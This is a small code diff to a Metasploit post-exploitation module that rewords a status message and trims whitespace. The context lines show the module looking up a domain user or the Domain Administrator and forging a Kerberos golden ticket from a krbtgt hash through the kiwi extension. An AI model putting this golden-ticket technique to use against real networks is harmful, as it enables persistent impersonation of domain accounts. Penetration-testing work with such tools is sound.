@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Post
 
     unless user
       if id && id != 0
-        print_status("Lookup up User #{id}")
+        print_status("Looking up User ID: #{id}")
         user = resolve_sid("#{domain_sid}-#{id}")[:name]
       else
         print_status('Looking up Domain Administrator account...')
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Post
         fail_with(Failure::Unknown, 'Unable to find User')
       end
     end
-    
+
     print_status("Creating Golden Ticket for #{domain}\\#{user}...")
     ticket = client.kiwi.golden_ticket_create(user, domain, domain_sid, krbtgt_hash, id, groups)
 
